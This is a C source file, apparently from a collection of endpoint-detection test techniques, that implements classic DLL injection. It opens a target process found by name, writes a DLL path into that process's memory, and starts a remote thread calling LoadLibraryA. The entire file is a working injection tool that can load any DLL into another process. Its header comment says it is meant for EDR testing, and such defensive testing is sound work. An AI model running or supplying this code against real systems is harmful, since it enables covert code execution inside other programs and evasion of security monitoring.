/*
 * Classic DLL Injection (CreateRemoteThread)
 * 
 * This technique injects a DLL into a target process by:
 * 1. Opening the target process
 * 2. Allocating memory in the target process
 * 3. Writing the DLL path to that memory
 * 4. Creating a remote thread that calls LoadLibraryA with the DLL path
 * 
 * For EDR testing purposes only.
 */

#include "../common/common.h"

/**
 * Perform classic DLL injection using CreateRemoteThread
 * 
 * @param pid Target process ID
 * @param dllPath Path to the DLL to inject
 * @return TRUE on success, FALSE on failure
 */
BOOL InjectDLL(DWORD pid, const char* dllPath) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID pRemoteDllPath = NULL;
    BOOL success = FALSE;
    
    // Validate DLL path
    if (!FileExists(dllPath)) {
        LOG_ERROR("DLL file not found: %s", dllPath);
        return FALSE;
    }
    
    // Open target process with required permissions
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );
    CHECK_HANDLE(hProcess, "Failed to open process");
    LOG_SUCCESS("Process handle obtained");
    
    // Verify permissions by attempting a small memory allocation
    LPVOID testAlloc = VirtualAllocEx(hProcess, NULL, 1, MEM_COMMIT, PAGE_READWRITE);
    if (testAlloc == NULL) {
        LOG_ERROR("Insufficient permissions for memory operations in target process");
        goto cleanup;
    }
    VirtualFreeEx(hProcess, testAlloc, 0, MEM_RELEASE);
    LOG_SUCCESS("Process permissions verified");
    
    // Allocate memory in target process for DLL path
    SIZE_T dllPathSize = strlen(dllPath) + 1;
    pRemoteDllPath = VirtualAllocEx(
        hProcess,
        NULL,
        dllPathSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    CHECK_HANDLE(pRemoteDllPath, "Failed to allocate memory in target process");
    LOG_SUCCESS("Memory allocated at: 0x%p (%zu bytes)", pRemoteDllPath, dllPathSize);
    
    // Write DLL path to allocated memory
    SIZE_T bytesWritten;
    CHECK_BOOL(
        WriteProcessMemory(hProcess, pRemoteDllPath, dllPath, dllPathSize, &bytesWritten),
        "Failed to write DLL path to target process"
    );
    LOG_SUCCESS("DLL path written (%zu bytes)", bytesWritten);
    
    // Get address of LoadLibraryA
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        LOG_ERROR("Failed to get kernel32.dll handle");
        goto cleanup;
    }
    
    LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
    CHECK_HANDLE(pLoadLibraryA, "Failed to get LoadLibraryA address");
    LOG_SUCCESS("LoadLibraryA address: 0x%p", pLoadLibraryA);
    
    // Create remote thread to execute LoadLibraryA
    hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibraryA,
        pRemoteDllPath,
        0,
        NULL
    );
    CHECK_HANDLE(hThread, "Failed to create remote thread");
    LOG_SUCCESS("Remote thread created");
    
    // Wait for thread completion
    LOG_INFO("Waiting for injection to complete...");
    WaitForSingleObject(hThread, INFINITE);
    
    DWORD exitCode;
    if (GetExitCodeThread(hThread, &exitCode)) {
        if (exitCode != 0) {
            LOG_SUCCESS("DLL injection completed successfully (Module handle: 0x%p)", (LPVOID)exitCode);
            success = TRUE;
        } else {
            LOG_ERROR("LoadLibraryA returned NULL - DLL may not have loaded");
        }
    }
    
cleanup:
    if (pRemoteDllPath && hProcess) {
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
    }
    SAFE_CLOSE_HANDLE(hThread);
    SAFE_CLOSE_HANDLE(hProcess);
    
    return success;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        PrintUsage(argv[0], 
                   "<process_name> <dll_path>",
                   "notepad.exe C:\\\\path\\\\to\\\\your.dll");
        return 1;
    }
    
    const char* processName = argv[1];
    const char* dllPath = argv[2];
    
    LOG_INFO("Classic DLL Injection Technique");
    LOG_INFO("Target Process: %s", processName);
    LOG_INFO("DLL Path: %s", dllPath);
    printf("\n");
    
    // Get target process ID
    DWORD pid = GetProcessIdByName(processName);
    if (pid == 0) {
        return 1;
    }
    LOG_SUCCESS("Found process with PID: %d\n", pid);
    
    // Perform injection
    if (InjectDLL(pid, dllPath)) {
        LOG_SUCCESS("Injection process completed");
        return 0;
    } else {
        LOG_ERROR("Injection process failed");
        return 1;
    }
}
